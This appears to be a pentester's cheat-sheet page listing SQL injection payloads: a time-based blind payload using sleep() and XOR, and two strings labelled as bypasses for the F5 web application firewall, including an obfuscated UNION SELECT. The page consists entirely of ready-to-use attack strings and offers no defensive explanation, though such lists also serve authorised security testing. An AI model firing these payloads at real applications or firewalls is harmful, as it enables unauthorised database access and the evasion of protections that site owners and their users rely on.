# General

Sysdate/Sleep/XOR:

```
`0'XOR(if(now()=sysdate(),sleep(6),0))XOR'`
```

# F5

F5 [[WAF Bypass]] 1:

```
+{`nothing`/*str*/(')}div%0B1+'
+{`nothing`/*str*/(')}div%0B0+'
```

F5 [[WAF Bypass]] 2:

```
{`noth`/*ing*/821}+union+%23%0a+distinctrow%0b/**/select+1,2,3--{`nothing`/**/TRUE}
```


